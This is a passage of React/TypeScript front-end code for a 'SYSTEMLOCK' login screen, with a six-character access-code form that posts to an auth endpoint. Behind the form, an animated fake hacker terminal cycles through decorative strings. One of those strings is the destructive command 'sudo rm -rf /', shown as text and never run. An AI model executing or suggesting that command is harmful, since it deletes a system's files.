    </div>
  );
}

function InfoBlock({ label, value, truncate = false }: { label: string; value: string | null | undefined; truncate?: boolean }) {
  return (
    <div className="flex flex-col gap-1">
      <span className="text-[10px] uppercase tracking-widest text-white/40">{label}</span>
      <span className={`font-mono text-xs text-white/90 ${truncate ? "truncate opacity-70" : "break-words"}`}>
        {value || "Unknown"}
      </span>
    </div>
  );
}

function LoginScreen({ onLogin }: { onLogin: (password: string, data: any) => void }) {
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [terminalLines, setTerminalLines] = useState<string[]>([]);

  useEffect(() => {
    const commands = [
      "Initializing secure connection...",
      "Bypassing mainframe security protocols...",
      "Decrypting payload...",
      "Establishing remote link...",
      "ACCESS DENIED.",
      "Retrying...",
      "Injecting malicious packet...",
      "Root access acquired.",
      "Downloading database...",
      "Compiling neural network model...",
      "Tracing IP address...",
      "Connecting to proxy server...",
      "[sys] Kernel panic - not syncing",
      "Analyzing encryption keys...",
      "sudo rm -rf /",
      "Ping 192.168.1.1 -t",
      "Extracting hashed passwords..."
    ];
    const interval = setInterval(() => {
      setTerminalLines(prev => {
        const newLine = `[${new Date().toISOString()}] root@sys: ${commands[Math.floor(Math.random() * commands.length)]}`;
        const newLines = [...prev, newLine];
        if (newLines.length > 35) newLines.shift();
        return newLines;
      });
    }, 150);
    return () => clearInterval(interval);
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (password.length < 6) return;
    setLoading(true);
    try {
      const res = await fetch("/api/auth", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ password })
      });
      const data = await res.json();
      if (res.ok && data.success) {
        onLogin(password, data);
      } else {
        setError(data.error || "Invalid Access Code");
        setPassword("");
      }
    } catch (e) {
      setError("Connection Failed");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="relative flex h-screen items-center justify-center overflow-hidden bg-black text-white p-4">
      {/* Terminal Background */}
      <div className="absolute inset-0 z-0 pointer-events-none p-4 font-mono text-[11px] text-green-500/30 opacity-60 leading-tight">
        {terminalLines.map((line, i) => (
          <div key={i}>{line}</div>
        ))}
        <div className="absolute inset-0 bg-gradient-to-t from-black via-transparent to-black pointer-events-none" />
      </div>

      <div className="z-10 max-w-md w-full bg-black/80 backdrop-blur-md border border-green-500/50 rounded-lg p-8 shadow-[0_0_40px_rgba(34,197,94,0.15)] relative overflow-hidden">
        <div className="absolute top-0 left-0 w-full h-1 bg-green-500 opacity-80 shadow-[0_0_10px_rgba(34,197,94,1)]" />
        <h1 className="text-3xl font-bold text-center mb-2 tracking-[0.3em] text-green-500 drop-shadow-[0_0_8px_rgba(34,197,94,0.8)]">SYSTEM<span className="font-light text-white">LOCK</span></h1>
        <p className="text-center text-[10px] text-green-500/60 mb-8 uppercase tracking-[0.4em] font-mono animate-pulse">Encrypted Access Terminal</p>
        
        <form onSubmit={handleSubmit} className="flex flex-col gap-8">
          <div className="flex justify-between gap-2">
            {[0, 1, 2, 3, 4, 5].map(i => (
              <input
                key={i}
                id={`otp-${i}`}
                type="text"
                maxLength={1}
                value={password[i] || ""}
                onChange={(e) => {
                  const val = e.target.value.toUpperCase();
                  if (val && !/^[A-Z0-9]$/.test(val)) return;
                  const newPass = password.split("");
                  newPass[i] = val;
                  setPassword(newPass.join(""));
                  if (val && i < 5) document.getElementById(`otp-${i + 1}`)?.focus();
                  setError("");
                }}
                onKeyDown={(e) => {
                  if (e.key === "Backspace" && !password[i] && i > 0) {
                    document.getElementById(`otp-${i - 1}`)?.focus();
                  }
                }}
                className={`w-12 h-14 bg-black border-2 outline-none text-center text-2xl font-mono uppercase transition-all
                  ${error ? 'border-red-500 text-red-500 shadow-[0_0_10px_rgba(239,68,68,0.5)]' : password[i] ? 'border-green-400 text-green-400 shadow-[0_0_15px_rgba(34,197,94,0.5)]' : 'border-green-900/50 text-green-700 focus:border-green-500 focus:shadow-[0_0_10px_rgba(34,197,94,0.3)]'}
                  rounded`}
              />
            ))}
          </div>
          
          {error && <p className="text-red-500 text-xs text-center font-mono animate-pulse drop-shadow-[0_0_5px_rgba(239,68,68,0.8)]">⚠ {error}</p>}
          
          <button 
            type="submit" 
            disabled={password.length < 6 || loading}
            className="w-full bg-green-900/40 text-green-400 border border-green-500/50 py-3 rounded font-mono font-semibold tracking-[0.2em] uppercase text-xs hover:bg-green-600/30 hover:text-green-300 hover:shadow-[0_0_20px_rgba(34,197,94,0.4)] transition-all disabled:opacity-30 disabled:hover:bg-green-900/40 disabled:hover:shadow-none"
          >
            {loading ? "Authenticating..." : "Authorize Access"}
          </button>
        </form>
      </div>
    </div>
  );
}
